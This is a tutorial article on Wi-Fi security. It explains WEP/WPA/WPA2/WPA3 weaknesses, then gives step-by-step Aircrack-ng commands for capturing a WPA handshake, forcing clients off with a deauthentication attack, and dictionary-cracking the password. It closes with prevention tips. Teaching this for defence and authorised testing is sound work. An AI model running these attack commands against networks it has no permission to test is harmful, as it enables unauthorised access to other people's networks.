# The Art of Wi-Fi Hacking & Protection with Aircrack-ng

## Introduction
Wi-Fi security is a crucial aspect of cybersecurity, and understanding how attackers exploit vulnerabilities can help us better protect our networks. In this article, we will explore how to hack a Wi-Fi network using Aircrack-ng and, more importantly, how to prevent such attacks.

> **Disclaimer:** This article is for educational purposes only. Unauthorized access to a network is illegal and punishable under cybersecurity laws.

![Image](https://github.com/user-attachments/assets/609a2d8a-924c-4037-916c-c8b6d3369253) <br/>

## Understanding Wi-Fi Security and Encryption
Wi-Fi networks primarily use **WEP, WPA, WPA2, and WPA3** encryption protocols:

- **WEP (Wired Equivalent Privacy):** Introduced in 1997, WEP was the first Wi-Fi encryption standard but is now obsolete due to its weak encryption algorithm (RC4) and short initialization vector (IV), making it highly vulnerable to **IV collision attacks and statistical cracking methods**.

- **WPA (Wi-Fi Protected Access):** Introduced as a temporary fix for WEP vulnerabilities, WPA used the **TKIP (Temporal Key Integrity Protocol)** encryption method. Although it improved security, it is still vulnerable to **brute-force and dictionary attacks**.

- **WPA2:** The most commonly used Wi-Fi security protocol, WPA2 uses **AES (Advanced Encryption Standard)** for stronger encryption. However, it remains susceptible to **WPA handshake attacks** and dictionary-based brute-force attacks.

- **WPA3:** The latest and most secure encryption standard, designed to address WPA2 weaknesses by implementing **Simultaneous Authentication of Equals (SAE)** (also known as the Dragonfly handshake), making it resistant to dictionary attacks. However, due to limited adoption, most networks still run WPA2.

## Examples/Types of Wi-Fi Attacks
Before diving into practical steps, let's briefly discuss common Wi-Fi attack techniques that hackers use:

1. **Deauthentication Attack:** Forces a connected client to disconnect from the Wi-Fi network, capturing the handshake when it reconnects.
2. **Dictionary Attack:** Uses a precompiled wordlist to brute-force a Wi-Fi password.
3. **Evil Twin Attack:** Sets up a rogue Wi-Fi access point that mimics a legitimate network to trick users into connecting and stealing credentials.
4. **WPS Pin Attack:** Exploits the weaknesses in Wi-Fi Protected Setup (WPS) to gain access to WPA/WPA2 networks.
5. **Packet Sniffing:** Captures and analyzes data packets to extract sensitive information using tools like Wireshark.
6. **Man-in-the-Middle (MITM) Attack:** Intercepts network traffic between the victim and the router to steal login credentials or inject malicious payloads.

### **Targeted Attacks for WEP, WPA, WPA2, and WPA3**
Before diving into the practical steps, let's briefly discuss how each encryption standard can be targeted:

- **WEP Attacks:**
  - **IV Collision Attack**: Exploits the short IV space to collect enough packets and crack the key.
  - **ARP Replay Attack**: Generates more traffic to speed up IV collection for cracking.

- **WPA Attacks:**
  - **Dictionary Attack**: Captures the 4-way handshake and brute-forces it using a wordlist.
  - **WPS PIN Attack**: Exploits vulnerabilities in Wi-Fi Protected Setup to recover WPA passwords.

- **WPA2 Attacks:**
  - **Handshake Capture & Brute Force**: Captures authentication handshakes and attempts to decrypt them.
  - **PMKID Attack**: Exploits vulnerabilities in some WPA2 networks without needing a connected client.

- **WPA3 Attacks:**
  - **Side-Channel Timing Attack**: Exploits weaknesses in the Dragonfly handshake implementation.
  - **Downgrade Attack**: Forces devices to connect using WPA2, making them susceptible to older attacks.

## Setup Requirements
To perform this attack, you need:
- A **Linux-based OS** (Kali Linux is recommended) installed via dual boot or a virtual machine.
- A **wireless network adapter** that supports **monitor mode and packet injection** (required for virtual machines, as built-in adapters may not work).

## Step-by-Step Wi-Fi Hacking Using Aircrack-ng

### **Step 1: Check Network Interfaces**
First, ensure your wireless adapter is recognized.
```bash
ifconfig
```
For newer systems:
```bash
ip a
```
List available wireless interfaces:
```bash
iwconfig
```
Identify the Wi-Fi adapter (e.g., wlan0) from the output.

### **Step 2: Enable Monitor Mode**
Enable monitor mode to capture packets from nearby Wi-Fi networks.
```bash
airmon-ng start wlan0
```
Verify the mode:
```bash
iwconfig
```
Your adapter should now be in **monitor mode** (e.g., wlan0mon).

### **Step 3: Scan for Wi-Fi Networks**
Use **airodump-ng** to scan for available networks.
```bash
airodump-ng wlan0mon
```
Identify the target network’s **BSSID (MAC Address)** and **Channel (CH).**

### **Step 4: Capture the WPA/WPA2 Handshake**
Start packet capturing on the target network’s channel.
```bash
airodump-ng -c [CH] --bssid [BSSID] -w handshake wlan0mon
```
Now, wait for a device to connect, or force a device disconnection using a **deauthentication attack**:
```bash
aireplay-ng --deauth 10 -a [BSSID] wlan0mon
```
Once a device reconnects, the **WPA handshake** will be captured.

### **Step 5: Crack the Password Using Aircrack-ng**
Use a dictionary attack with a wordlist (e.g., rockyou.txt):
```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [BSSID] handshake.cap
```
If the password is in the wordlist, it will be revealed.

## How to Prevent Wi-Fi Hacking
### **1. Use a Strong Password**
- Avoid common words.
- Use a mix of uppercase, lowercase, numbers, and special characters.
- Use a **minimum of 16 characters.**

### **2. Enable WPA3 Encryption**
- If supported, switch to WPA3, which is resistant to dictionary attacks.

### **3. Disable WPS (Wi-Fi Protected Setup)**
- WPS can be brute-forced easily, leading to a compromised network.

### **4. Monitor Network Activity**
- Use intrusion detection tools like **Wireshark** or **Kismet**.
- Check for **unauthorized devices** connected to your network.

### **5. Use MAC Address Filtering**
- Allow only trusted MAC addresses to connect to your network.

### **6. Reduce Signal Strength**
- Prevent external attacks by adjusting your router’s power settings to cover only the required area.

### **7. Regularly Update Firmware**
- Keep your router’s firmware up-to-date to patch vulnerabilities.

## Conclusion
Hacking a Wi-Fi network using Aircrack-ng is a practical demonstration of how insecure passwords can be cracked. However, understanding these techniques allows users to fortify their networks against such attacks. By implementing strong security measures, you can prevent unauthorized access and ensure a secure wireless environment.

